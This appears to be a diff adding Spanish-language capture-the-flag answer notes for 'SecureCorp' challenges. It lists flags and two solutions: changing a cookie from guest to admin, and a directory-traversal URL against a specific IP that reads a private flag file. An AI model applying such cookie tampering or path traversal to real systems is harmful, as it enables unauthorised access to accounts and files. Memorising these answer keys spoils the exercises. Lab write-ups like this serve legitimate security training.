@@ -1,2 +1,17 @@
 SecureCorp — Desbloqueo de administración: flag{h1dd3n_1n_pl41n_s1ght_css_c4m0fl4g3}
 Señales de Tráfico Web - flag{m3j0r_n0_c0nfi3s_3n_l0s_b0ts}
+
+SECURECORP - PORTAL DE EMPLEADOS
+
+Solución: 
+Buscar las cookies y cambiar el valor de guest a admin
+flag{5849BEF4D723FABC30D58334035825C8818C2FE7A4B99098F076D782C75C01B0}
+
+
+SECURECORP - CENTRO DE DOCUMENTACION
+
+Solución:
+Url a usar -> http://167.233.94.148:8000/?doc=../../../private/flag.txt
+flag{lf1_d1r3ct0ry_tr4v3rs4l_v4ult_l34k}
+
+
